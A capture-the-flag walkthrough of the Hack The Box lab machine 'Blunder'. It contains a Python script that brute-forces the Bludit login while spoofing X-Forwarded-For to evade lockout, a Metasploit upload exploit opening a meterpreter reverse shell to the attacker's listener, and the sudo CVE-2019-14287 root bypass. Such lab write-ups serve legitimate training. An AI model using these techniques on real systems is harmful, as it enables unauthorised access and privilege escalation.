## Blunder

__Machine IP: 10.10.10.191__
__Difficulty: Medium__


## Scanning

## Nmap Scanning

```bash
$ nmap -sC -sV  -oN nmap/blunder  10.10.10.191 -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-13 12:38 EDT
Nmap scan report for 10.10.10.191
Host is up (0.11s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.45 seconds
```


## Enumeration

- Homepage
![homapage](images/homepage.PNG)

### Gobuster

```bash
$ gobuster -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt dir -u  http://10.10.10.191 -o gobuster/gobuster.out -x php,txt -b 403,404
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:                     http://10.10.10.191
[+] Threads:                 10
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-large-files.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.0.1
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
2021/09/13 16:36:01 Starting gobuster
===============================================================
/install.php (Status: 200)
/robots.txt (Status: 200)
/.gitignore (Status: 200)
/todo.txt (Status: 200)

```

- username `fergus` found in `todo.txt` 
- Found a login page, but it blocks `IP` when brute-forced

- request payload

```php
POST /admin/login HTTP/1.1
Host: 10.10.10.191
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 86
Origin: http://10.10.10.191
Connection: close
Referer: http://10.10.10.191/admin/login
Cookie: BLUDIT-KEY=i1m43ndl4q19c8fgi78mhi0j84
Upgrade-Insecure-Requests: 1

tokenCSRF=ee3b1781576045ea9eb643413144e4c95bcef724&username=admin&password=admin&save=
```

After a google search found that `X-Forwarded-For: <IP>` can be added and bruteforeced with new `IP` to avoid blocking


__Creating wordlists__

- `Cewl`

```bash
$: cewl http://10.10.10.191/ > wordlist.txt
```

- Python script to automate the requests


```python
import requests
import re
import random
HOST = '10.10.10.191'
USER = 'fergus'

PROXY = {'http': 'http://127.0.0.1:8080'}

def init_session():
	r = requests.get('http://10.10.10.191/admin/')
	csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-f0-9]*)"' , r.text)
	csrf = csrf.group(1)
	cookie= r.cookies.get('BLUDIT-KEY')
	return csrf,cookie

def login(user, password):
	csrf,cookie = init_session()
	headers = {
	'X-Forwarded-For': f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
	}
	data = {'tokenCSRF' : csrf,
	'username': user,
	'password': password,
	'save':''}
	
	cookies ={'BLUDIT-KEY' : cookie}


	r = requests.post('http://10.10.10.191/admin/login',cookies=cookies, data=data, proxies=PROXY, allow_redirects=False, headers=headers)
	if r.status_code !=200:
		print(f"{USER}:{password}")
		print('csrf error')
		return False
	elif 'password incorrect' in r.text :
		return False
	elif 'has been blocked' in r.text:
		print('blocked')
		return False
	else:
		print(f"{USER}:{password}")
		return True

		
words = open('wordlist.txt').readlines()
for line in words:
	# print(line.strip())
	try:
		login(USER, line.strip())
	except:
		print("error")
```

```bash
$ python3 bludit.py
fergus:RolandDeschain
```

- Log in with `fergus:RolandDeschain`

![dashboard](images/dashboard.PNG)

- searchsploit has a authenticated  exploit (`Directory Traversal Image File Upload`)

```bash
─$ searchsploit bludit                                                                   1 ⚙
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
Bludit  3.9.2 - Authentication Bruteforce Mitigation Bypass | php/webapps/48746.rb
Bludit - Directory Traversal Image File Upload (Metasploit) | php/remote/47699.rb
Bludit 3.9.12 - Directory Traversal                         | php/webapps/48568.py
Bludit 3.9.2 - Auth Bruteforce Bypass                       | php/webapps/48942.py
Bludit 3.9.2 - Authentication Bruteforce Bypass (Metasploit | php/webapps/49037.rb
Bludit 3.9.2 - Directory Traversal                          | multiple/webapps/48701.txt
bludit Pages Editor 3.0.0 - Arbitrary File Upload           | php/webapps/46060.txt
```


## Exploitation

```bash
msf6 > search bludit

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/bludit_upload_images_exec

msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(linux/http/bludit_upload_images_exec) > show options

Module options (exploit/linux/http/bludit_upload_images_exec):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   BLUDITPASS                   yes       The password for Bludit
   BLUDITUSER                   yes       The username for Bludit
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       The base path for Bludit
   VHOST                        no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.37.128   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Bludit v3.9.2


msf6 exploit(linux/http/bludit_upload_images_exec) > set BLUDITPASS RolandDeschain
BLUDITPASS => RolandDeschain
msf6 exploit(linux/http/bludit_upload_images_exec) > set BLUDITUSER fergus
BLUDITUSER => fergus
msf6 exploit(linux/http/bludit_upload_images_exec) > set rhosts 10.10.10.191
rhosts => 10.10.10.191
msf6 exploit(linux/http/bludit_upload_images_exec) > set lhost tun2
lhost => tun2
msf6 exploit(linux/http/bludit_upload_images_exec) > run

[*] Started reverse TCP handler on 10.10.14.12:4444 
[+] Logged in as: fergus
[*] Retrieving UUID...
[*] Uploading qpHQeUQMMg.png...
[*] Uploading .htaccess...
[*] Executing qpHQeUQMMg.png...
[*] Sending stage (39282 bytes) to 10.10.10.191
[*] Meterpreter session 1 opened (10.10.14.12:4444 -> 10.10.10.191:46940) at 2021-09-13 16:56:42 -0400
[+] Deleted .htaccess

meterpreter > 
```


## Privilege escalation

- `linpeas` discovered user `Hugo` hash `faca404fd5c0a31cf1897b823c695c85cffeb98d`, when decrypted resulted to `Password120`

- switching to user `hugo`

```bash
hugo@blunder:/tmp$ sudo -l
sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash

```


```bash
hugo@blunder:/tmp$ sudo -V
sudo -V
Sudo version 1.8.25p1
Sudoers policy plugin version 1.8.25p1
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.25p1

```
We see that we are allowed to run bash as any user, except root.  sudo -V reveals that the machine has version 1.8.25p1 installed, which we learn is vulnerable to `CVE-2019-14287`. This vulnerability allows us to bypass the user restriction, by supplying -1 or its unsigned equivalent (4294967295) to convert it into UID 0 (root). 


```bash
hugo@blunder:/tmp$ sudo -u#-1 /bin/bash
sudo -u#-1 /bin/bash
```
